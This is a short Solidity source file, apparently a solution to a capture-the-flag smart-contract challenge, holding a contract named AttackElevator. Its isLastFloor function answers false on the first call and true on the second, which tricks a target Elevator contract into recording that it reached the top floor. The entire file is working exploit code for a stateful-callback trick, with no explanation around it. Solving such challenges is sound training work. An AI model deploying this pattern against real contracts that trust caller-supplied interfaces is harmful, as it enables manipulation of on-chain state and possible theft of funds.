// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IElevator {
    function goTo(uint _floor) external;
}

contract AttackElevator {
    bool public toggle;
    address public elevator;

    constructor(address _elevator) public {
        elevator = _elevator;
    }

    function isLastFloor(uint _num) external returns (bool) {
        if (!toggle) {
            toggle = true;
            return false;
        }
        return true;
    }

    function elevate() external {
        IElevator(elevator).goTo(1);
    }
}